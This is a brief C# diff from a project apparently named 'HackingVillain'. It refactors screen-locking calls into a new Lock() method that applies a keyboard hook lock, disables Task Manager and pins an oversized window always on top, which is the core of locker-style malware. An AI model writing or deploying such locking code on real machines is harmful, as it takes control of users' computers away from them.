@@ -24,11 +24,16 @@ namespace HackingVillain
             {
                 this.Size = new Size(10000, 10000);
                 this.TopMost = true;
-                _hook.Lock();
-                TaskManager(false);
-                TopMostAlways.SetTopmost(this.Handle);
+                Lock();
             }
             catch { }
+        }
+
+        public void Lock()
+        {
+            _hook.Lock();
+            TaskManager(false);
+            TopMostAlways.SetTopmost(this.Handle);
         }
 
         /// <summary>
